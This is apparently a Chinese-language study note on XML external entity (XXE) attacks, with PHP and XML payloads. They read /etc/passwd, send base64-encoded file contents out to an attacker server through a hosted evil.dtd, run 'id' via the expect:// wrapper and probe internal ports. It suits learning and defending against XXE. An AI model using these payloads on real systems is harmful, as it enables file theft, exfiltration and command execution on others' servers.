# XXE攻击

## 基础知识
XML External Entity，xml外部实体攻击。  

其它缩写：  
PCDATA，Parsed Character Data，被解析的字符数据  
DTD，Document Type Definition，文档类型定义  

内部实体声明：  
```xml
<?xml version="1.0"?>
<!DOCTYPE test [
<!ENTITY writer "Bill Gates">
<!ENTITY copyright "Copyright W3School.com.cn">
]>

<test>&writer;&copyright;</test>
```

外部实体声明：  
```xml
<?xml version="1.0"?>
<!DOCTYPE test [
<!ENTITY writer SYSTEM "http://www.w3school.com.cn/dtd/entities.dtd">
<!ENTITY copyright SYSTEM "http://www.w3school.com.cn/dtd/entities.dtd">
]>
<author>&writer;&copyright;</author>
```

最基础的读取文件  
```xml
<?xml version="1.0"?>
<!DOCTYPE a [
    <!ENTITY b SYSTEM "file:///etc/passwd">
]>
<c>&b;</c>
```


## 危害举例
### 读取任意文件
1. 有回显
```php
<?php
$xml=<<<EOF
<?xml version="1.0"?>
<!DOCTYPE a [
    <!ENTITY b SYSTEM "file:///etc/passwd">
]>
<c>&b;</c>
EOF;
$data = simplexml_load_string($xml);
print_r($data);
?>
```

2. 无回显
可以把数据发到我们的服务器  
攻击脚本：  
```php
<?php
$xml=<<<EOF
<?xml version="1.0"?>
<!DOCTYPE ANY [
    <!ENTITY % file SYSTEM "php://filter/ read=convert.base64-encode/ resource=/etc/issue">
    <!ENTITY % dtd SYSTEM "http://192.168.1.122/evil.dtd">
%dtd;
%send;
]>
EOF;
$data = simplexml_load_string($xml);
# print_r($data);
?>
```

我们服务器部署evil.dtd：  
```r
<!ENTITY % all
"<!ENTITY % send SYSTEM 'http://192.168.1.122/?%file;'>"
>
%all;
```

### 执行系统命令
这里用的是 php的expect扩展  
```php
<?php
$xml=<<<EOF
<?xml version="1.0"?>
<!DOCTYPE ANY [
    <!ENTITY a SYSTEM "expect://id">
]>
<c>&a;</c>
EOF;
$data = simplexml_load_string($xml);
print_r($data);
?>
```

别的扩展应该也有类似功能。  


### 探测内网端口
请求对应内网网站端口，根据返回内容判断端口是否开放  
```php
<?php
$xml=<<<EOF
<?xml version="1.0"?>
<!DOCTYPE ANY [
    <!ENTITY a SYSTEM "http://192.168.1.1:80/index.php">
]>
<b>%a;</b>
EOF;
$data = simplexml_load_string($xml);
print_r($data);
?>
```


### 攻击内网
和探测内网端口的手段类似，发送不同的内容


## 原链接
原链接：https://www.cnblogs.com/r00tuser/p/7255939.html  


---
2020/11/20  
